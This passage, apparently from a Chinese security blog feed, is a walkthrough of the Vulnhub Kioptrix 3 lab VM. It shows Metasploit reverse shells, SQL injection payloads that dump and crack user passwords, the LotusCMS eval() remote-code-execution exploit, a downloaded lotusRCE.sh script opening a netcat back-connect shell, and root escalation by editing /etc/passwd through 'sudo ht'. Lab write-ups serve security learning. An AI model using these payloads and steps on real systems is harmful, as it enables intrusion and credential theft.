class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST 192.168.43.177</span><br><span class="line">LHOST =&gt; 192.168.43.177</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.177:443 </span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.43.158</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.177:443 -&gt; 192.168.43.158:51226) at 2018-05-08 12:53:09 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /home/www/kioptrix3.com</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-15 09:21:17 -0400  cache</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  core</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  data</span><br><span class="line">100644/rw-r--r--  23126  fil   2011-04-14 12:23:13 -0400  favicon.ico</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2011-04-14 11:32:31 -0400  gallery</span><br><span class="line">100644/rw-r--r--  26430  fil   2011-04-14 12:23:13 -0400  gnu-lgpl.txt</span><br><span class="line">100644/rw-r--r--  399    fil   2011-04-14 12:23:13 -0400  index.php</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  modules</span><br><span class="line">40777/rwxrwxrwx   4096   dir   2011-04-14 12:24:17 -0400  style</span><br><span class="line">100644/rw-r--r--  243    fil   2011-04-14 12:23:13 -0400  update.php</span><br></pre></td></tr></table></figure><p>权限有点小，很多命令都执行不了的。</p><h3><span id="sqlmap进行sql注入">SQLmap进行SQL注入</span></h3><p>这个站是有的链接有问题，302跳转到<code>kioptrix3.com</code></p><p>在<code>etc/passwd</code>添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.158  kioptrix3.com</span><br></pre></td></tr></table></figure><p><code>service networking restart</code>重启服务</p><p>发现url存在SQL注入。<code>kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_7.png" alt=""></p><p>先用<code>sqlmap</code>进行注入测试，id存在报错注入。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_8.png" alt=""></p><p>尝试查找下后台管理员账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>得到管理员账号密码，但是在</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p><p>无法登录，另外找到一个登录的地方<code>http://kioptrix3.com/gallery/gadmin/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery</span><br><span class="line">Table: gallarific_users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | n0t7t1k4 |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure><p>但是可以登录。</p><p>这里虽然可以是<code>root</code>和<code>dba</code>权限，但是没有绝对路径。不能直接用sqlmap进行写shell。</p><h3><span id="手注sqli">手注sqli</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p>判断一共有6列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_9.png" alt=""></p><p>得到当前数据库和版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema%20=%20database()#</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_10.png" alt=""></p><p>得到当前数据库所有的表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name%20=0x6465765f6163636f756e7473#</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_11.png" alt=""></p><p>获取表里的列名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_12.png" alt=""></p><h3><span id="lotus-cms-漏洞">Lotus CMS 漏洞</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit Lotus CMS</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                         |  Path</span><br><span class="line">                                                       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py</span><br><span class="line">Lotus Core CMS 1.0.1 - Remote File Inclusion           | exploits/php/webapps/5866.txt</span><br><span class="line">LotusCMS 3.0 - &apos;eval()&apos; Remote Command Execution (Meta | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities              | exploits/php/webapps/16982.txt</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>从查询结果看，有一个本地文件包含和一个远程代码执行，</p><p>这里的本地文件包含就是我们之前发现的那个。我们尝试下这个本地文件包含漏洞</p><p>尝试发现这个漏洞好像不行。</p><p>尝试<code>LotusCMS 3.0 - &#39;eval()&#39; Remote Command Execution</code> 发现是一个rb文件。</p><p>于是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search LotusCMS</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                              Disclosure Date  Rank       Description</span><br><span class="line">   ----                              ---------------  ----       -----------</span><br><span class="line">   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution</span><br></pre></td></tr></table></figure><p>利用这个漏洞进行攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/http/lcms_php_exec </span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                     yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.58</span><br><span class="line">RHOST =&gt; 192.168.43.58</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set PAYLOAD generic/shell_bind_tcp </span><br><span class="line">PAYLOAD =&gt; generic/shell_bind_tcp</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set URI /</span><br><span class="line">URi =&gt; /</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST    192.168.43.58    yes       The target address</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /                yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.58    no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.43.58:80) was unreachable.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; set RHOST 192.168.43.158</span><br><span class="line">RHOST =&gt; 192.168.43.158</span><br><span class="line">msf exploit(multi/http/lcms_php_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Command shell session 1 opened (192.168.43.177:44505 -&gt; 192.168.43.158:4444) at 2018-05-08 10:02:56 -0400</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">ls</span><br><span class="line">cache</span><br><span class="line">core</span><br><span class="line">data</span><br><span class="line">favicon.ico</span><br><span class="line">gallery</span><br><span class="line">gnu-lgpl.txt</span><br><span class="line">index.php</span><br><span class="line">modules</span><br><span class="line">style</span><br><span class="line">update.php</span><br><span class="line">pwd </span><br><span class="line">/home/www/kioptrix3.com</span><br></pre></td></tr></table></figure><p>我尝试用<code>cd</code>命令进入<code>gallery</code>目录但是不行，</p><p>这里用到<code>ls -l</code>可以看到<code>gallery</code>目录的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ls -l gallery</span><br><span class="line">total 156</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK</span><br><span class="line">-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql</span><br><span class="line">-rw-r--r-- 1 root root   252 Apr 12  2011 g.php</span><br><span class="line">drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line">-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php</span><br><span class="line">-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php</span><br><span class="line">-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 index.php</span><br><span class="line">-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK</span><br><span class="line">-rw-r--r-- 1 root root   212 Apr 12  2011 login.php</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php</span><br><span class="line">-rw-r--r-- 1 root root   249 Apr 12  2011 p.php</span><br><span class="line">drwxrwxrwx 2 root root  4096 Apr 12  2011 photos</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php</span><br><span class="line">-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php</span><br><span class="line">-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php</span><br><span class="line">-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php</span><br><span class="line">-rw-r--r-- 1 root root   215 Apr 12  2011 register.php</span><br><span class="line">drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin</span><br><span class="line">-rw-r--r-- 1 root root   213 Apr 12  2011 search.php</span><br><span class="line">-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php</span><br><span class="line">drwxr-xr-x 6 root root  4096 Apr 12  2011 themes</span><br><span class="line">-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt</span><br><span class="line">-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php</span><br></pre></td></tr></table></figure><p>发现<code>gconfig.php</code>配置文件，<code>cat</code>读配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span><br><span class="line"></span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure><h3><span id="lotusrcesh">lotusRCE.sh</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# chmod +x lotusRCE.sh</span><br><span class="line">root@kali:~# ./lotusRCE.sh 192.168.43.158</span><br><span class="line"></span><br><span class="line">Path found, now to check for vuln....</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;Hood3dRob1n</span><br><span class="line">Regex found, site is vulnerable to PHP Code Injection!</span><br><span class="line"></span><br><span class="line">About to try and inject reverse shell....</span><br><span class="line">what IP to use?</span><br><span class="line">192.168.43.177</span><br><span class="line">What PORT?</span><br><span class="line">2333</span><br><span class="line"></span><br><span class="line">OK, open your local listener and choose the method for back connect: </span><br><span class="line">1) NetCat -e    3) NetCat Backpipe5) Exit</span><br><span class="line">2) NetCat /dev/tcp  4) NetCat FIFO</span><br><span class="line">#? 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp# nc -lvp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.43.177] from kioptrix3.com [192.168.43.158] 56259</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h2><span id="权限提升">权限提升</span></h2><p>尝试用之前SQL注入得到的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>进行SSH连接，发现第一个账号不能没有多大的作用，不能提权。</p><p>连接第二个账号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span><br><span class="line">loneferret@Kioptrix3:~$ ls</span><br><span class="line">checksec.sh  CompanyPolicy.README</span><br></pre></td></tr></table></figure><p>存在一个<code>CompanyPolicy.README</code>文件.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checksec.sh  CompanyPolicy.README</span><br><span class="line">loneferret@Kioptrix3:~$ cat CompanyPolicy.README </span><br><span class="line">Hello new employee,</span><br><span class="line">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br><span class="line">Please use the command &apos;sudo ht&apos;.</span><br><span class="line">Failure to do so will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">CEO</span><br></pre></td></tr></table></figure><p>英语比较垃圾，百度翻译的意思是可以通过<code>sudo ht</code>对文件进行编辑，创建。</p><p>在kali下尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure><p>报错不能打开一个<code>xterm-256color.</code>终端。</p><p>回到本地环境用<code>xshell</code>连接是可以打开的</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_13.png" alt=""></p><p>此时按<code>F3</code>，可以输入<code>/etc/passwd</code>或者<code>/etc/sudoers</code>文件来进行文件编辑</p><p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_14.png" alt=""></p><p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_15.png" alt=""></p><p>重新登录SSH。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Last login: Tue May  8 19:27:01 2018 from uknow-pc</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),100(users)</span><br><span class="line">root@Kioptrix3:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>此时已经是<code>root</code>权限了。</p><h2><span id="总结">总结</span></h2><p>这次实验过程挺长的，发现了很多地方的问题，第一是发现了<code>phpmyadmin</code>我尝试用写日志的方法试试能不能拿到shell。但是发现<code>phpmyadmin</code>变量了不存在<code>general log</code>变量。</p><p>另外就是这里有个SQL注入，可以用<code>sqlmap</code>跑出来，是<code>root</code>权限。尝试用<code>os-shell</code>写shell。通过了之前用远程命令执行得到的绝对路径，但是还是无法写入。好像是目录权限的问题。</p><p>在<code>phpmyadmin</code>下也无法执行<code>INTO OUTFILE</code>函数。显示<code>#1 - Can&#39;t create/write to file</code>。从在命令执行里也看得出来目录是没有权限的。</p><p>在最后补充了一个文件包含和后台上传的利用，这个组合通过文件包含执行图片木马，得到一个shell。虽然说很鸡肋，还是感觉有点厉害的。</p><p>在实验过程中还是想多多尝试多种方法的，但是实验环境还是有限。但在这次实验中还是学到了很多，做了几次<code>vulnhub</code>的实验了，感觉提权方面还是有学习到很多。</p><p>虽然说这些环境有点不常见甚至奇葩，但是还是在这个过程中学到了<code>linux</code>环境下的一些之前一直匮乏的知识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;信息收集&quot;&gt;信息收集&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;同样用&lt;code&gt;netdiscover&lt;/code&gt;发现目标主机。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 2</title>
    <link href="https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-2.html"/>
    <id>https://uknowsec.cn/posts/notes/Vulnhub渗透测试练习-Kioptrix-2.html</id>
    <published>2018-05-07T08:53:11.000Z</published>
    <updated>2019-01-07T08:24:19.632Z</updated>
    
